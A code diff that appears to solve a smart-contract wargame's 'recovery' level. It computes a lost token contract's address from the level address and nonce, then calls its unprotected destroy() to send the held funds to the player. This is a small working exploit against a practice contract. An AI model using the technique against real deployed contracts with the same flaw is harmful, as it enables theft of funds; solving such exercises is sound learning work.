@@ -3,16 +3,16 @@ import { ethers } from 'ethers';
 import { BigNumber, Signer, BytesLike } from "ethers";
 import { getSigner } from "./signer";
 import { Recovery__factory, SimpleToken__factory } from "../typechain";
+import { createLevel, submitLevel } from './utils';
 
 async function main() {
-  const instanceAddress = "0x0D953e99956cF5C97087B75257b3017A8A118bba";
   const signer = getSigner();
-  const tokenAddress = "0x10f37b501c4204e37bc3d32e7764577fa3defe8f"
-  const target = SimpleToken__factory.connect(tokenAddress, signer);
-  await target.deployed();
+  const level = await createLevel(signer,"recovery");
   const owner = await signer.getAddress();
-  await (await target.destroy(owner)).wait();
-
+  // generate contract address from level with nonce 1
+  const lostcoinAddress = ethers.utils.getContractAddress({from: level, nonce: 1});
+  await SimpleToken__factory.connect(lostcoinAddress,signer).destroy(owner);
+  await submitLevel(signer,level);
 }
 
 main()
